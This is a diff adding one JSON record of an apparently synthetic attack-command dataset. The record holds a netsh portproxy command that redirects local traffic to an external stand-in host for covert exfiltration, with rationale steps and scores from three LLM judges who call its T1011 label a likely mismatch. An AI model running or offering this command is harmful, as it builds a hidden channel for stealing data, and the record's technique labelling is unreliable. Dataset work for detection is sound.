@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=49333 connectaddress=198.51.100.88 connectport=49334",
+  "explanation": "Adds a loopback v4-to-v4 port proxy using high, uncommon ports to quietly redirect local connections to an external host, facilitating exfiltration over a non-standard TCP port (T1011).",
+  "rationale_steps": [
+    "Create a hidden local exfil endpoint that forwards to an external address.",
+    "Leverage non-standard ports (49333/49334) to avoid common port monitoring.",
+    "Allow arbitrary tools to send data to localhost while it egresses to a remote exfil server."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-dc2d341a",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for the netsh interface portproxy add command, including all required parameters with proper format and no syntax errors.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly establishes a port proxy that could be used for exfiltration, it doesn't align with T1011 (Exfiltration Over Other Network Medium) but rather with T1572 (Protocol Tunneling) or T1090 (Proxy), as it doesn't involve alternate network mediums like USB or Bluetooth.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:58:42.561118Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The `netsh interface portproxy add v4tov4` command is perfectly well-formed with correct syntax for key-value pair arguments, valid IP addresses, and port numbers.",
+        "semantic_score": 0,
+        "semantic_justification": "The command creates a static port forward to a fixed IP address, which directly contradicts the 'dynamic resolution' aspect of T1011, and it incorrectly states 'None' for privilege as `netsh portproxy` requires administrator rights.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:58:47.476245Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The netsh interface portproxy add v4tov4 command is correctly formed with valid parameters and no quoting or flag issues.",
+        "semantic_score": 1,
+        "semantic_justification": "It creates a static local-to-remote TCP proxy and requires admin rights, providing no dynamic resolution behavior (e.g., DGA/fast-flux/dynamic DNS) and conflicting with the stated no-privilege context.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:59:09.116200Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
